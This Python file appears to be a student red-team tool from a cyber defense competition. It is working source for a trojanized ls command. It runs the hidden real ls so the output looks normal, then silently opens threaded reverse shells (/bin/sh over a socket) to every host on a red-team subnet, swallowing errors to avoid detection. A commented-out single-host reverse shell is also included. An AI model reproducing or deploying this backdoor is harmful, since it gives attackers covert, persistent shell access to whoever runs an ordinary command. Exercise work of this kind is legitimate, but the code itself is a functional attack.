# Daniel Wolosiuk
# Cyber Defense Techniques 2025 Red Team Tool
# Oct 17, 2025
# dw4102@rit.edu

import netifaces
import subprocess
import sys
import socket
import os
import pty
import threading


def main():
    args = sys.argv[1:]
    run_real_ls(args)
    malicious_component()

def run_real_ls(arguments):
    """Run the real LS command. The real command is hidden at who.debianutils

    Args:
        The arguments that are passed into the ls commands so they get passed through
        to the real command
    """
    # The real ls command will be hidden on the system. In this case, "who.debianutils"
    # Moving the real ls command will occur in ansible
    ls_command_with_args = ["who.debianutils", "--color=auto"]
    #ls_command_with_args = ["ls", "--color=auto"]
    ls_command_with_args.extend(arguments)
    ls_result = subprocess.call(ls_command_with_args)

def malicious_component():
    """The malicious component to this software. After running the real ls command, 
        a reverse shell is spawned to connect to every device on the red team subnet

    """
    # Initial specialized connection configuration
    # Basic logic of connecting a reverse shell to a single pre-defined IP address
    """
    RHOST="debianbookwormred"
    RPORT=4444
    s=socket.socket()
    try:
        s.connect((RHOST, RPORT))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        subprocess.Popen(["/bin/sh"], stdin=s, stdout=s, stderr=s)
    except socket.error:
        #return None # handle the error silently to not give the binary away
        pass
    """

    # Red team subnet is 10.0.20.0/24
    # Reach out to every host in red team subnet for every ls command
    # Same as before connection configuration, will just iterate for every red host

    # RPORT calculations are different. See README.md for how calculation is done
    local_ip = str(get_local_ip())
    octets = local_ip.split(".")
    RPORT = (int(octets[2]) * 10000) + int(octets[3]) 
    # Consideration for 192.168.x.x (cloud boxes). Just add 500 to the port 
    if octets[0] == '192':
        RPORT = RPORT + 500
    #print(f"RPORT: {RPORT}")
    
    for index in range(1, 255):
        RHOST = "10.20.0." + str(index) # Corrected red team subnet since it changed
        #RHOST = "100.94.45." + str(index) # My test tailscale net
        try:
            # Create new thread for every attempted socket so that command doesn't take a while to execute
            threading.Thread(target=background_socket_connect, args=(RHOST, RPORT)).start()
        except socket.error:
            #return None
            continue # pass to next iteration of loop


def background_socket_connect(ip, port):
    """function that serves creating reverse shell in a new socket in a separate thread

    Args:
        ip: The IP address to connect the reverse shell to
        port: The port the reverse shell connects to
    """
    try:
        s = socket.socket()
        s.settimeout(0.5)
        #result = sock.connect_ex((ip, port))
        s.connect((ip, port))
        # Reverse shell code
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        subprocess.Popen(["/bin/sh"], stdin=s, stdout=s, stderr=s)
    except Exception as e:
        return None


def get_local_ip():
    """get the local IP address of the machine that this is run on

    Returns:
        the IP address of the local machine
    """
    try:
        interfaces = netifaces.interfaces()
        ethernet_interface = interfaces[1] # Will be the ethernet connected interface
        ifaddress = netifaces.ifaddresses(ethernet_interface)
        if netifaces.AF_INET in ifaddress:
            ipv4_all_info = ifaddress[netifaces.AF_INET]
            for info in ipv4_all_info:
                ip_address = info['addr']
                return ip_address
    except Exception as e:
        return None
 
if __name__ == "__main__":
    main()